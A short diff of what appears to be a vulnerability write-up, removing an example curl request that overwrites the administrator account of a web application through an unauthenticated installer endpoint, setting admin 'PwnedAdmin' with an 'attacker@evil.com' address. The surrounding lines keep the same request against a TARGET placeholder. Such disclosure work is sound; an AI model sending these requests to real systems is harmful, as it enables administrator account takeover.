@@ -113,16 +113,6 @@ curl -i -X POST "http://TARGET/install/api/admin-config-setup" \
   --data-urlencode "password=Pwned12345"
 ```
 
-Example:
-
-```bash
-curl -i -X POST "http://172.25.44.135:8084/install/api/admin-config-setup" \
-  -H "X-Requested-With: XMLHttpRequest" \
-  --data-urlencode "admin=PwnedAdmin" \
-  --data-urlencode "email=attacker@evil.com" \
-  --data-urlencode "password=Pwned12345"
-```
-
 After execution:
 
 - The administrator account is updated.
